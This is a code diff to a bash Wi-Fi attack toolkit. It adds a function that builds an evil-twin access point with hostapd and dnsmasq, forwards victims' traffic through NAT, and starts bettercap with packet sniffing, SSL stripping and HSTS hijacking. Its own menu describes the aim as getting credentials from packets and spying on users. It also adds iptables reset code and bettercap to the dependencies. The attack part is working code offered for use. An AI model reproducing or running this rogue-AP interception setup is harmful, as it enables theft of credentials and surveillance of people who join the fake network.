@@ -29,6 +29,17 @@ function ctrl_c(){
 
     clear
     rm -r 1 iface.txt dnsmasq.conf hostapd.conf > /dev/null 2>&1
+
+   #clear iptables
+    iptables -P INPUT ACCEPT
+    iptables -P FORWARD ACCEPT
+    iptables -P OUTPUT ACCEPT
+    iptables -t nat -F
+    iptables -t mangle -F
+    iptables -F
+    iptables -X
+
+    echo 0 > /proc/sys/net/ipv4/ip_forward
     sleep 1.5;exit 0
 
 }
@@ -661,11 +672,19 @@ function menu(){
             15)
                 echo -ne "\n\t${greenColour}Bye, bye :)${endColour}\n"
                 tput cnorm; airmon-ng stop iw_wificraKmon > /dev/null 2>&1
-
                 ifconfig iw_wificraK down
                 ip link set iw_wificraK name $networkCard
                 ifconfig $networkCard up
-
+                rm -r 1 iface.txt dnsmasq.conf hostapd.conf > /dev/null 2>&1
+		   #clear iptables
+                iptables -P INPUT ACCEPT
+                iptables -P FORWARD ACCEPT
+                iptables -P OUTPUT ACCEPT
+                iptables -t nat -F 
+                iptables -t mangle -F
+                iptables -F
+                iptables -X
+                echo 0 > /proc/sys/net/ipv4/ip_forward
                 sleep 1.5;exit 0
                 ;;
 
@@ -1007,6 +1026,71 @@ function constant_deauth_attack(){
 
 }
 
+function eviltwin_and_sniffing(){
+    clear
+    all_banners_menu
+
+    echo -ne "\n${blueColour}[*]${endColour}${grayColour} Set evil ap name: ${endColour}" && read ap_name
+    echo -ne "${blueColour}[*]${endColour} ${grayColour}Set evil AP channel: ${endColour}" && read channel
+    echo -ne "${blueColour}[*]${endColour}${grayColour} Set your internet interface (Ex. eth0, enp0s3, etc): ${endColour}" && read internet_interface
+
+
+    #hostapd config
+    echo -e "interface=iw_wificraKmon" > hostapd.conf
+    echo -e "driver=nl80211" >> hostapd.conf
+    echo -e "ssid=$ap_name" >> hostapd.conf
+    echo -e "hw_mode=g" >> hostapd.conf
+    echo -e "channel=$channel" >> hostapd.conf
+    echo -e "macaddr_acl=0" >> hostapd.conf
+    echo -e "auth_algs=1" >> hostapd.conf
+    echo -e "ignore_broadcast_ssid=0" >> hostapd.conf
+
+    xterm -T "Hostapd Started" -hold -e "hostapd hostapd.conf" &
+
+    echo -e "[+] Hostapd started"
+
+    # Config interface
+    ifconfig iw_wificraKmon 10.0.0.1 netmask 255.255.255.0
+
+    echo -e "[+] Interface ip & netmask configured"
+
+    #dnsmasq
+    echo -e "interface=iw_wificraKmon" >> dnsmasq.conf
+    echo -e "dhcp-range=10.0.0.10,10.0.0.25,255.255.255.0,12h" >> dnsmasq.conf
+    echo -e "dhcp-option=3,10.0.0.1" >> dnsmasq.conf
+    echo -e "dhcp-option=6,10.0.0.1" >> dnsmasq.conf
+    echo -e "server=8.8.8.8" >> dnsmasq.conf
+    echo -e "log-queries" >> dnsmasq.conf
+    echo -e "log-dhcp" >> dnsmasq.conf
+    echo -e "listen-address=127.0.0.1" >> dnsmasq.conf
+
+    xterm -geometry 50x50+100+300  -T "Dnsmasq Started" -hold -e "dnsmasq -C dnsmasq.conf -d" & 
+
+
+    echo -e "[+] Dnsmasq started"
+
+    #routing table
+
+    route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+
+    # Ip tables (Activate internet)
+    iptables --table nat --append POSTROUTING --out-interface $internet_interface -j MASQUERADE
+    iptables --append FORWARD --in-interface iw_wificraKmon -j ACCEPT
+
+    # forward packets to internet
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+
+    echo -e "[+] Iptables set"
+
+    echo -e "[+] sniffing ..."
+
+    # sniffing
+    xterm -T "Bettercap (Sniffing)" -hold -e "bettercap -iface iw_wificraKmon -eval 'net.probe on; net.recon on; net.sniff on;set http.proxy.sslstrip true;hstshijack/hstshijack'" &
+
+
+}
+
+
 
 function evil_twin_options(){
 
@@ -1016,10 +1100,14 @@ function evil_twin_options(){
         clear
 		all_banners_menu
 
+	echo -ne "\n${yellowColour}[*]${endColour}${grayColour}Tools for Eviltwin Attacks:${endColour}"
         echo -ne "\n${blueColour}[1]${endColour}${grayColour} Fluxion${endColour}\n"
         echo -ne "${blueColour}[2]${endColour}${grayColour} Wifiphisher${endColour}\n"
         echo -ne "${blueColour}[3]${endColour}${grayColour} Wifipumpkin3${endColour}\n"
-        echo -ne "${blueColour}[4]${endColour}${grayColour} Back${endColour}\n"
+
+	echo -ne "\n${yellowColour}[*]${endColour}${grayColour}Evil Twin Attack Options:${endColour}\n"
+	echo -ne "${blueColour}[4]${endColour} ${grayColour}Evil ap + sniffing with bettercap (Get credentials from packets and spy users)${endColour}\n"
+	echo -ne "${blueColour}[5] ${endColour}${grayColour}Back${endColour}\n"
 
 		echo -ne "\n${yellowColour}[>]${endColour}${grayColour} Choose an option > ${endColour}" && read opc
 
@@ -1051,9 +1139,13 @@ function evil_twin_options(){
 
 
             4)
-
-                menu
+		#eviltwinopt
+                eviltwin_and_sniffing
                 ;;
+
+            5)
+		menu
+		;;
 
             *) 
                 echo -ne "${redColour}[!]${endColour} $opc Invalid Option\n"
@@ -1094,7 +1186,7 @@ function qhelppanel(){
 function dependencies(){
 
     ## checking dependencies
-    dependencies=(wifipumpkin3 aircrack-ng macchanger xterm hcxdumptool crunch wash reaver mdk3 mdk4 wifiphisher git php-cgi dhcpd lighttpd bc)
+    dependencies=(bettercap wifipumpkin3 aircrack-ng macchanger xterm hcxdumptool crunch wash reaver mdk3 mdk4 wifiphisher git php-cgi dhcpd lighttpd bc)
 
     echo -ne "${purpleColour}[*] ${endColour}${blueColour}Checking dependencies${endColour}\n"
 
